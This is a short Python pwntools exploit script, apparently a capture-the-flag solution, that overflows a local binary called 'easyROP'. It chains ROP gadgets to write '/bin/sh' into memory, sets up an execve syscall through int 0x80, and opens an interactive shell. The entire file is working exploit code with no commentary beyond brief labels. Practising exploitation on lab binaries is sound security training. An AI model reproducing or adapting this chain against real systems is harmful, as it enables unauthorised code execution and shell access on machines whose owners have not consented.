#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./easyROP')

gadget = 0x805468b # mov dword ptr [edx], eax ; ret
pop_eax_ret = 0x80b7e06
pop_edx_ret = 0x806ec5a
pop_edx_ecx_ebx = 0x0806ec80
buf = 0x080EB02F
int_80 = 0x806c8d5

#write to memory
payload = "a"*24
payload += p32(pop_edx_ret)
payload += p32(buf)
payload += p32(pop_eax_ret)
payload += "/bin"
payload += p32(gadget)
payload += p32(pop_edx_ret)
payload += p32(buf+4)
payload += p32(pop_eax_ret)
payload += "/sh\x00"
payload += p32(gadget)

#write to register
payload += p32(pop_edx_ecx_ebx)
payload += p32(0)
payload += p32(0)
payload += p32(buf)
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(int_80)
gdb.attach(r)
print len(payload)
r.recvuntil(":")
r.sendline(payload)

r.interactive()
